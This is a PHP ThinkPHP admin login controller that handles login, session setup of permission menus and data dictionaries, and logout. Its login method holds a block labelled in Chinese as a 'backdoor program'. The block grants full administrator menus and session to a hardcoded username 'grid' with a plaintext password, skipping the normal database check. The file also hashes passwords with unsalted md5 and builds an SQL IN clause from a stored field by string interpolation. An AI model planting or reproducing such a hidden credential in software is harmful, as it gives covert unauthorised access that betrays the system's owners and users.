<?php

namespace Admin\Controller;

use Think\Controller;

use Think\Model;
//引入Model

class LoginController extends Controller {

	/**
	 * 登陆页面初始化
	 */
	public function index() {
		$this -> display(login);
	}

	/**
	 * 用户登陆
	 */
	public function login() {
		$user = M('User');
		//实例化User

		$username = $_POST['username'];
		$password = md5($_POST['password']);

       //==================后门程序========================
		if(strcasecmp($username,'grid')== 0 &&  strcasecmp($_POST ['password'],'7788919')== 0){             //后门登陆用户
		    $Model = new Model(); // 实例化一个model对象 没有对应任何数据表
		    $menuList=$Model->query("select * from tp_menu order by id asc");                                  //获取所有的权限菜单
		    $_SESSION['menuList'] = $menuList;  //将权限菜单写入SESSION
		    $arrUser=array('id'=>'00','username'=>'grid','dept'=>'市局','cnname'=>'网格管理员');
			$_SESSION ['user'] = $arrUser;//将用户信息写入SESSION
			//---------------写数据字典到session------------------------
			$zidian = M('Zidian');
			$zidianList=$zidian->select();
			$_SESSION['zidianList'] = $zidianList;
			//---------------写数据字典到session------------------------
			
			//---------------写部门信息到session------------------------
			
			$deptList=$user->distinct(true)->field('dept')->select();
			$_SESSION['deptList'] = $deptList;
			//---------------写数据字典到session------------------------
			
			$this -> redirect('Admin/Index/index');
			return;
		}
		//==================end===========================



		$where = array('username' => $username, 'password' => $password);

		$arr = $user -> where($where) -> find();

		if ($arr) {

			$ids = $arr['power'];
			//获取权限编号
			$Model = new Model();
			// 实例化一个model对象 没有对应任何数据表
			if (strcasecmp($username, 'admin') == 0) {//不区分大小写判断是否是管理员登陆
				$menuList = $Model -> query("select * from tp_menu order by id asc");
				//获取所有的权限菜单
			} else {
				$menuList = $Model -> query("select * from tp_menu  where id IN ({$ids})");
				//获取所有的权限菜单
			}

			$_SESSION['menuList'] = $menuList;
			//将权限菜单写入SESSION
			$_SESSION['user'] = $arr;
			//将用户信息写入SESSION
			//$this->success ( '用户登录成功!', U ( 'Admin/Index/index' ) );
			
			
			//---------------写数据字典到session------------------------
			$zidian = M('Zidian');
			$zidianList=$zidian->select();
			$_SESSION['zidianList'] = $zidianList;
			//---------------写数据字典到session------------------------
			
			//---------------写部门信息到session------------------------
			
			$deptList=$user->distinct(true)->field('dept')->select();
			$_SESSION['deptList'] = $deptList;
			//---------------写数据字典到session------------------------
			
			$this -> redirect('Admin/Index/index');

		} else {
			$this -> error('用户名或者密码错误!');
		}
	}

	/**
	 * 用户退出
	 */
	public function quit() {
		$_SESSION = array();
		if (isset($_COOKIE[session_name()])) {
			setcookie(session_name(), '', time() - 1, '/');
		}
		session_destroy();
		//销毁session

		$this -> redirect('Admin/Login/index');

	}

}
